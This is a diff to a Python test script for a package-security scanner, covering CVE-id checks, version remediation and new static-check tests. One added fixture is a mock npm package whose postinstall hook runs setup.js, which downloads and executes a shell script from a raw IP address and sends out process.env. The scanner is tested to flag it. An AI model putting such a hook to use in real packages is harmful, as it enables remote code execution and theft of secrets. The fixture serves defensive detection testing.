@@ -3,8 +3,8 @@ import os
 import tempfile
 
 os.environ["GUARDIAN_DATA_DIR"] = tempfile.mkdtemp()
-os.environ.pop("GROQ_API_KEY", None)
-os.environ.pop("GUARDIAN_LLM_API_KEY", None)
+os.environ["GROQ_API_KEY"] = ""  # empty (not absent) so backend/.env cannot fill it: no real API calls
+os.environ["GUARDIAN_LLM_API_KEY"] = ""
 
 from semantic_version import Version  # noqa: E402
 
@@ -22,6 +22,7 @@ if __name__ == "__main__":
     assert llm.check_ids("see CVE-2020-7610", {"CVE-2020-7610"}) == []
     assert llm.check_ids("see CVE-1999-0001", {"CVE-2020-7610"})                         # invented id
     # No key: the pipeline still gets a clean "unavailable" result
+    assert not llm.API_KEY
     r = llm.ask("t", "x@1", "s", "u", lambda a: [])
     assert not r["ok"] and "unavailable" in r["reason"]
 
@@ -44,4 +45,17 @@ if __name__ == "__main__":
     t, _ = remediate.walk_chain(["mongodb", "mongodb-core", "bson"], Version("2.1.18"))
     assert str(t) == "0.4.23"
     assert remediate.jump(Version("2.1.18"), Version("3.0.0")) == "major"
+    # Investigate: built-in static checks
+    from app.agents.investigate import rule_verdict, static_checks
+    files = {"package.json": ['{', '  "scripts": {', '    "postinstall": "node setup.js"', '  }', '}'],
+             "setup.js": ["const cp = require('child_process')",
+                          "https.get('http://45.9.148.3/x.sh', r => cp.exec('sh x.sh'))",
+                          "send(process.env)"]}
+    hits = static_checks(files, hook_lines=[3])
+    rules = {h["rule"] for h in hits}
+    assert {"download-and-execute", "download", "exec", "secrets", "network-target"} <= rules, rules
+    assert all(h["file"] in files and h["line"] >= 1 for h in hits)
+    assert rule_verdict([], hits)[0] == "risky" and rule_verdict(["MAL-2023-1"], [])[0] == "malicious"
+    benign = static_checks({"package.json": ['"install": "node-gyp rebuild"']}, hook_lines=[1])
+    assert rule_verdict([], benign)[0] == "unknown", benign
     print("day2 ok")
